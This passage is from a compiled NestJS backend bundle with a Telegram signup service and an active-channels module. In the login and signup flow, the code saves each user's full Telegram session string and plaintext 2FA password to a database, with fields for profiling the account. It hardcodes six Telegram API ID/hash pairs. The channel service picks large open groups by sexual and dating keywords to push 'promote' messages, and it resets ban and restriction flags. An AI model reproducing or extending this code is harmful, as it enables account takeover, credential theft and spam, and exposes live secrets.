                    throw new common_1.BadRequestException('Invalid response from Telegram server');
                }
                if (signInResult instanceof tl_1.Api.auth.AuthorizationSignUpRequired) {
                    this.logger.log(`New user registration required for ${phone}`);
                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);
                    await this.disconnectClient(phone);
                    return result;
                }
                const sessionString = client.session.save();
                if (!sessionString) {
                    throw new Error('Failed to generate session string');
                }
                const userData = await this.processLoginResult(signInResult.user, sessionString, password);
                await this.disconnectClient(phone);
                return userData;
            }
            catch (error) {
                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                    this.logger.warn(`2FA required for ${phone}`);
                    if (!password) {
                        return {
                            status: 400,
                            message: 'Two-factor authentication required',
                            requires2FA: true
                        };
                    }
                    return await this.handle2FALogin(phone, session.client, password);
                }
                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||
                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {
                    throw new common_1.BadRequestException('Invalid OTP,  Try again!');
                }
                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);
                throw new common_1.BadRequestException('Verification failed. Please try again.');
            }
        }
        catch (error) {
            this.logger.error(`Verification error for ${phone}: ${error.message}`);
            if (error.message?.includes('No active signup session') ||
                error.message?.includes('Connection failed')) {
                await this.disconnectClient(phone);
            }
            throw error instanceof common_1.BadRequestException ? error :
                new common_1.BadRequestException(error.message || 'Verification failed, please try again');
        }
    }
    async handle2FALogin(phone, client, password) {
        try {
            this.logger.debug(`Fetching password SRP parameters for ${phone}`);
            const passwordSrpResult = await client.invoke(new tl_1.Api.account.GetPassword());
            this.logger.debug(`Computing password check for ${phone}`);
            const passwordCheck = await (0, Password_1.computeCheck)(passwordSrpResult, password);
            this.logger.debug(`Invoking CheckPassword API for ${phone}`);
            const signInResult = await client.invoke(new tl_1.Api.auth.CheckPassword({
                password: passwordCheck,
            }));
            if (!signInResult || !signInResult.user) {
                throw new common_1.BadRequestException('Invalid response from Telegram server');
            }
            this.logger.log(`2FA login successful for ${phone}`);
            const sessionString = client.session.save();
            if (!sessionString) {
                throw new Error('Failed to generate session string');
            }
            const userData = await this.processLoginResult(signInResult.user, sessionString, password);
            await this.disconnectClient(phone);
            return userData;
        }
        catch (error) {
            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);
            if (password) {
                throw new common_1.BadRequestException('Incorrect 2FA password');
            }
            throw new common_1.BadRequestException('2FA password required');
        }
    }
    async handleNewUserRegistration(phone, client, phoneCodeHash) {
        try {
            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;
            const signUpResult = await client.invoke(new tl_1.Api.auth.SignUp({
                phoneNumber: phone,
                phoneCodeHash,
                firstName: randomName,
                lastName: '',
            }));
            if (!signUpResult || !signUpResult.user) {
                throw new common_1.BadRequestException('Invalid response from Telegram server');
            }
            const sessionString = client.session.save();
            if (!sessionString) {
                throw new Error('Failed to generate session string');
            }
            return await this.processLoginResult(signUpResult.user, sessionString);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, "TGSIGNUP", false);
            this.logger.error(`Failed to register new user: ${errorDetails.message}`);
            throw new common_1.BadRequestException(errorDetails.message || 'Failed to register new user');
        }
    }
    async processLoginResult(user, sessionString, password) {
        try {
            if (!user || !sessionString) {
                throw new Error('Invalid user data or session string');
            }
            const now = new Date();
            const userData = {
                mobile: user.phone?.toString()?.replace(/^\+/, '') || '',
                session: sessionString,
                firstName: user.firstName || '',
                lastName: user.lastName || '',
                username: user.username || '',
                tgId: user.id?.toString() || '',
                twoFA: !!password,
                password: password || null,
                lastActive: now.toISOString().split('T')[0],
                expired: false,
                channels: 0,
                personalChats: 0,
                totalChats: 0,
                otherPhotoCount: 0,
                ownPhotoCount: 0,
                ownVideoCount: 0,
                otherVideoCount: 0,
                recentUsers: [],
                calls: {
                    chatCallCounts: [],
                    incoming: 0,
                    outgoing: 0,
                    totalCalls: 0,
                    video: 0,
                },
                contacts: 0,
                movieCount: 0,
                msgs: 0,
                photoCount: 0,
                videoCount: 0,
                gender: 'unknown',
            };
            if (!userData.mobile || !userData.tgId) {
                throw new Error('Invalid user data received from Telegram');
            }
            await this.usersService.create(userData);
            return {
                status: 200,
                message: 'Registration successful',
                session: sessionString,
            };
        }
        catch (error) {
            this.logger.error('Error processing login result:', error);
            if (error instanceof common_1.BadRequestException) {
                throw error;
            }
            throw new common_1.InternalServerErrorException('Failed to complete registration');
        }
    }
};
exports.TgSignupService = TgSignupService;
TgSignupService.LOGIN_TIMEOUT = 300000;
TgSignupService.SESSION_CLEANUP_INTERVAL = 300000;
TgSignupService.PHONE_PREFIX = "+";
TgSignupService.activeClients = new Map();
TgSignupService.API_CREDENTIALS = [
    { apiId: 27919939, apiHash: "5ed3834e741b57a560076a1d38d2fa94" },
    { apiId: 25328268, apiHash: "b4e654dd2a051930d0a30bb2add80d09" },
    { apiId: 12777557, apiHash: "05054fc7885dcfa18eb7432865ea3500" },
    { apiId: 27565391, apiHash: "a3a0a2e895f893e2067dae111b20f2d9" },
    { apiId: 27586636, apiHash: "f020539b6bb5b945186d39b3ff1dd998" },
    { apiId: 29210552, apiHash: "f3dbae7e628b312c829e1bd341f1e9a9" }
];
exports.TgSignupService = TgSignupService = TgSignupService_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], TgSignupService);


/***/ }),

/***/ "./src/components/active-channels/active-channels.controller.ts":
/*!**********************************************************************!*\
  !*** ./src/components/active-channels/active-channels.controller.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const create_active_channel_dto_1 = __webpack_require__(/*! ./dto/create-active-channel.dto */ "./src/components/active-channels/dto/create-active-channel.dto.ts");
const update_active_channel_dto_1 = __webpack_require__(/*! ./dto/update-active-channel.dto */ "./src/components/active-channels/dto/update-active-channel.dto.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const add_reaction_dto_1 = __webpack_require__(/*! ./dto/add-reaction.dto */ "./src/components/active-channels/dto/add-reaction.dto.ts");
let ActiveChannelsController = class ActiveChannelsController {
    constructor(activeChannelsService) {
        this.activeChannelsService = activeChannelsService;
    }
    async create(createActiveChannelDto) {
        return this.activeChannelsService.create(createActiveChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.activeChannelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        return this.activeChannelsService.search(query);
    }
    async findAll() {
        return this.activeChannelsService.findAll();
    }
    async findOne(channelId) {
        return this.activeChannelsService.findOne(channelId);
    }
    async update(channelId, updateActiveChannelDto) {
        return this.activeChannelsService.update(channelId, updateActiveChannelDto);
    }
    async remove(channelId) {
        return this.activeChannelsService.remove(channelId);
    }
    addReaction(channelId, addReactionDto) {
        if (!addReactionDto.reactions) {
            throw new common_1.BadRequestException('Reaction is required');
        }
        return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);
    }
    getRandomReaction(channelId) {
        return this.activeChannelsService.getRandomReaction(channelId);
    }
    removeReaction(channelId, addReactionDto) {
        if (!addReactionDto.reactions) {
            throw new common_1.BadRequestException('Reaction is required');
        }
        return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);
    }
};
exports.ActiveChannelsController = ActiveChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new active channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_active_channel_dto_1.CreateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_active_channel_dto_1.CreateActiveChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'wordRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'dMRestriction', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'availableMsgs', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'reactions', required: false, type: [String] }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'reactRestricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'megagroup', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all active channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_active_channel_dto_1.UpdateActiveChannelDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an active channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)(':channelId/reactions'),
    (0, swagger_1.ApiOperation)({ summary: 'Add reaction to chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, add_reaction_dto_1.AddReactionDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "addReaction", null);
__decorate([
    (0, common_1.Get)(':channelId/reactions/random'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a random reaction from chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "getRandomReaction", null);
__decorate([
    (0, common_1.Delete)(':channelId/reactions'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove reaction from chat group' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, add_reaction_dto_1.AddReactionDto]),
    __metadata("design:returntype", Promise)
], ActiveChannelsController.prototype, "removeReaction", null);
exports.ActiveChannelsController = ActiveChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Active Channels'),
    (0, common_1.Controller)('active-channels'),
    __metadata("design:paramtypes", [active_channels_service_1.ActiveChannelsService])
], ActiveChannelsController);


/***/ }),

/***/ "./src/components/active-channels/active-channels.module.ts":
/*!******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.module.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const active_channels_service_1 = __webpack_require__(/*! ./active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const active_channels_controller_1 = __webpack_require__(/*! ./active-channels.controller */ "./src/components/active-channels/active-channels.controller.ts");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ../promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
let ActiveChannelsModule = class ActiveChannelsModule {
};
exports.ActiveChannelsModule = ActiveChannelsModule;
exports.ActiveChannelsModule = ActiveChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: active_channel_schema_1.ActiveChannel.name, schema: active_channel_schema_1.ActiveChannelSchema }]),
            promote_msgs_module_1.PromoteMsgModule
        ],
        controllers: [active_channels_controller_1.ActiveChannelsController],
        providers: [active_channels_service_1.ActiveChannelsService],
        exports: [active_channels_service_1.ActiveChannelsService]
    })
], ActiveChannelsModule);


/***/ }),

/***/ "./src/components/active-channels/active-channels.service.ts":
/*!*******************************************************************!*\
  !*** ./src/components/active-channels/active-channels.service.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ActiveChannelsService = void 0;
const promote_msgs_service_1 = __webpack_require__(/*! ./../promote-msgs/promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const active_channel_schema_1 = __webpack_require__(/*! ./schemas/active-channel.schema */ "./src/components/active-channels/schemas/active-channel.schema.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
let ActiveChannelsService = class ActiveChannelsService {
    constructor(activeChannelModel, promoteMsgsService) {
        this.activeChannelModel = activeChannelModel;
        this.promoteMsgsService = promoteMsgsService;
    }
    async create(createActiveChannelDto) {
        createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne());
        const createdChannel = new this.activeChannelModel(createActiveChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => ({
            updateOne: {
                filter: { channelId: dto.channelId },
                update: { $set: dto },
                upsert: true
            }
        }));
        await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.activeChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateActiveChannelDto) {
        delete updateActiveChannelDto["_id"];
        const updatedChannel = await this.activeChannelModel.findOneAndUpdate({ channelId }, { $set: updateActiveChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async removeFromAvailableMsgs(channelId, msg) {
        return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } });
    }
    async addToAvailableMsgs(channelId, msg) {
        return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } });
    }
    async remove(channelId) {
        const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.activeChannelModel.find(filter).exec();
    }
    async addReactions(channelId, reactions) {
        const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {
            $addToSet: { reactions: reactions }
        });
        return channel;
    }
    async getRandomReaction(channelId) {
        const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();
        if (!channel) {
            return undefined;
        }
        if (channel.reactions.length === 0) {
            return undefined;
        }
        const randomIndex = Math.floor(Math.random() * channel.reactions.length);
        return channel.reactions[randomIndex];
    }
    async removeReaction(channelId, reaction) {
        const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {
            $pull: { reactions: reaction },
        });
        return channel;
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$or': [
                        { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                        { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                    ]
                },
                {
                    '$or': [
                        { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                        { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 600 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                    forbidden: false
                }
            ]
        };
        const sort = { participantsCount: -1 };
        try {
            const result = await this.activeChannelModel.aggregate([
                { $match: query },
                { $skip: skip },
                { $limit: limit },
                { $sort: sort },
                { $project: { randomField: 0 } }
            ]).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.activeChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async resetWordRestrictions() {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Reset Available Msgs`);
        try {
            await this.activeChannelModel.updateMany({
                banned: false
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0
                }
            });
        }
        catch (e) {
            console.log((0, parseError_1.parseError)(e));
        }
    }
    async resetAvailableMsgs() {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for Reset Available Msgs`);
        try {
            const data = await this.promoteMsgsService.findOne();
            const keys = Object.keys(data);
            await this.activeChannelModel.updateMany({
                $expr: {
                    $lt: [{ $size: { $ifNull: ["$availableMsgs", []] } }, 5]
                }
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0,
                    "banned": false,
                    "availableMsgs": keys
                }
            });
        }
        catch (e) {
            console.log((0, parseError_1.parseError)(e));
        }
    }
    async updateBannedChannels() {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Request Received for update banned Channels`);
        await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {
            $set: {
                "wordRestriction": 0,
                "dMRestriction": 0,
                banned: false,
                "private": false
            }
        });
    }
    async updateDefaultReactions() {
        await this.activeChannelModel.updateMany({}, {
            $set: {
                reactions: [
                    '❤', '🔥', '👏', '🥰', '😁', '🤔',
                    '🤯', '😱', '🤬', '😢', '🎉', '🤩',
                    '🤮', '💩', '🙏', '👌', '🕊', '🤡',
                    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
                    '🤣', '💔', '🏆', '😭', '😴', '👍',
                    '🌚', '⚡', '🍌', '😐', '💋', '👻',
                    '👀', '🙈', '🤝', '🤗', '🆒',
                    '🗿', '🙉', '🙊', '🤷', '👎'
                ]
            }
        });
    }
};
exports.ActiveChannelsService = ActiveChannelsService;
exports.ActiveChannelsService = ActiveChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(active_channel_schema_1.ActiveChannel.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_msgs_service_1.PromoteMsgsService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        promote_msgs_service_1.PromoteMsgsService])
], ActiveChannelsService);


/***/ }),

/***/ "./src/components/active-channels/dto/add-reaction.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/active-channels/dto/add-reaction.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddReactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class AddReactionDto {
}
exports.AddReactionDto = AddReactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({ required: true }),
    __metadata("design:type", Array)
], AddReactionDto.prototype, "reactions", void 0);


/***/ }),

/***/ "./src/components/active-channels/dto/create-active-channel.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/active-channels/dto/create-active-channel.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateActiveChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateActiveChannelDto {
    constructor() {
        this.reactRestricted = false;
        this.wordRestriction = 0;
        this.dMRestriction = 0;
        this.reactions = [
            '❤', '🔥', '👏', '🥰', '😁', '🤔',
            '🤯', '😱', '🤬', '😢', '🎉', '🤩',
            '🤮', '💩', '🙏', '👌', '🕊', '🤡',
            '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
            '🤣', '💔', '🏆', '😭', '😴', '👍',
            '🌚', '⚡', '🍌', '😐', '💋', '👻',
            '👀', '🙈', '🤝', '🤗', '🆒',
            '🗿', '🙉', '🙊', '🤷', '👎'
        ];
        this.banned = false;
        this.private = false;
    }
}
exports.CreateActiveChannelDto = CreateActiveChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 300 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "reactRestricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    __metadata("design:type", String)
], CreateActiveChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "wordRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: 0 }),
    __metadata("design:type", Number)
], CreateActiveChannelDto.prototype, "dMRestriction", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ type: [String] }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "availableMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        type: [String], default: [
            '❤', '🔥', '👏', '🥰', '😁', '🤔',
            '🤯', '😱', '🤬', '😢', '🎉', '🤩',
            '🤮', '💩', '🙏', '👌', '🕊', '🤡',
            '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
            '🤣', '💔', '🏆', '😭', '😴', '👍',
            '🌚', '⚡', '🍌', '😐', '💋', '👻',
            '👀', '🙈', '🤝', '🤗', '🆒',
            '🗿', '🙉', '🙊', '🤷', '👎'
        ]
    }),
    __metadata("design:type", Array)
], CreateActiveChannelDto.prototype, "reactions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: false }),
    __metadata("design:type", Boolean)
], CreateActiveChannelDto.prototype, "banned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ default: true, required: false }),
